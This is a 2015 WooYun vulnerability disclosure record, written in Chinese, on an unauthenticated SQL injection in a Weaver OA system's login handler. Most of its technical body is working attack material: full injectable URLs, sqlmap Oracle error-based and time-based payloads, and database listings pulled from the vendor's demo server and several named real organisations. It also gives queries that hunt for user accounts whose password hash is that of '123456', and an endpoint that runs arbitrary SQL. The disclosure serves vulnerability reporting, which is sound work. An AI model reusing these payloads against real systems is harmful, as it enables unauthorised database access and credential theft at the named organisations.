{"id": 2481, "wybug_id": "wooyun-2015-0124589", "wybug_title": "泛微某通用系统存在SQL注入漏洞（无需登录）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "浮萍", "wybug_date": "2015-07-05 15:27", "wybug_open_date": "2015-08-23 17:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向公众公开  简要描述： SQL注入 详细说明：  以官方为例http://pm.weaver.cn:9085/main/login.jsp\n\n用户名sysadmin  密码任意 提示密码错误当用户名输入sysadmin'时\n\n提示\norg.springframework.jdbc.BadSqlGrammarException: StatementCallback; bad SQL grammar [select longonname from sysuser where lower(longonname)=lower('sysadmin'')]; nested exception is java.sql.SQLSyntaxErrorException: ORA-01756: 引号内的字符串没有正确结束\n\n\n初步判断为oracle数据库然后抓包 \nhttp://pm.weaver.cn:9085/j_acegi_security_check?dynamicpass=&encData=&ip=xxxxx&isIP=0&isdx=0&isusb=0&j_password=a&j_username=sysadmin'&needauthcode=0&rememberme=0&rndData=345655458600837&sendpass=0&uname=sysadmin'\n\nqlmap identified the following injection points with a total of 213 HTTP(s) requests:---Parameter: #1* (URI)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: http://pm.weaver.cn:9085/j_acegi_security_check?dynamicpass=&encData=&ip=127.0.0.1&isIP=0&isdx=0&isusb=0&j_password=a&j_username=sysadmin') AND 9205=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(120)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (9205=9205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(118)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('bDuh'='bDuh&needauthcode=0&rememberme=0&rndData=345655458600837&sendpass=0&uname=sysadmin    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: http://pm.weaver.cn:9085/j_acegi_security_check?dynamicpass=&encData=&ip=127.0.0.1&isIP=0&isdx=0&isusb=0&j_password=a&j_username=sysadmin') AND 4148=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(112)||CHR(75)||CHR(104),5) AND ('nMaw'='nMaw&needauthcode=0&rememberme=0&rndData=345655458600837&sendpass=0&uname=sysadmin---\n为oracle数据库有37个数据库\nback-end DBMS: Oracleavailable databases [37]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EWEAVER[*] EWEAVER5TEST[*] EWEAVERINHOUSE[*] EWEAVERTEST[*] EXFSYS[*] FTOA01[*] FTPOM[*] HR[*] HTF[*] IX[*] MDSYS[*] MOBILEDEMO[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] PMECOLOGY[*] POWER[*] POWER01[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WEAVERIM[*] WFPM[*] WMSYS[*] XDB[*] ZTDBA[*] ZTKG[*] ZZB[*] ZZBMIS3\n当前库为\ncurrent schema (equivalent to database on Oracle):    'EWEAVERINHOUSE'\n登录的用户表为SYSUSER查看用户数\n\n同样查看一下密码为123456的人\nselect  count(*) from SYSUSER where LOGONPASS  = 'e10adc3949ba59abbe56e057f20f883e'\n\n\n\nselect LOGONPASS from SYSUSER where LONGONNAME = 'sysadmin';\n查看sysadmin密码，可惜解密收费  就不再解密登录了另外官网也可以执行sql查看数据库版本\nhttp://pm.weaver.cn:9085/ServiceAction/com.eweaver.base.DataAction?sql=|20select|20*|20from|20v$version|20where|20rownum|20=|201\n\n\n登录采用了明文密码登录   漏洞证明：  案例http://oa.ad-mart.cn\n\n\nhttp://oa.ad-mart.cn/j_acegi_security_check?dynamicpass=&encData=&ip=127.0.0.1&isIP=0&isdx=0&isusb=0&j_password=a&j_username=sysadmin*&needauthcode=0&rememberme=0&rndData=345655458600837&sendpass=0&uname=sysadmin*\" --dbs\n数据库 \navailable databases [19]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EWEAVER[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDB\n\n\n密码为123456的用户\n\nhttp://mail.weifu.com.cn\n\n\n\"http://mail.weifu.com.cn/j_acegi_security_check?dynamicpass=&encData=&ip=127.0.0.1&isIP=0&isdx=0&isusb=0&j_password=a&j_username=sysadmin*&needauthcode=0&rememberme=0&rndData=345655458600837&sendpass=0&uname=sysadmin*\" --dbs\n数据库\navailable databases [21]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EWEAVER[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] OAWEIFU[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] WEIFU[*] WMSYS[*] XDB\n用户select count(*) from sysuser;:    '1345'某公司内网\n\"http://10.0.0.*/j_acegi_security_check?dynamicpass=&encData=&ip=127.0.0.1&isIP=0&isdx=0&isusb=0&j_password=a&j_username=sysadmin*&needauthcode=0&rememberme=0&rndData=345655458600837&sendpass=0&uname=sysadmin*\" --dbs\n数据库\navailable databases [19]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EWEAVER[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDB\n查看用户并分别查询一下密码为123456  0000 000000的用户\n\n   修复方案：  过滤～～   版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-07-09 17:13 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-13 08:06 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  又没选通用。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}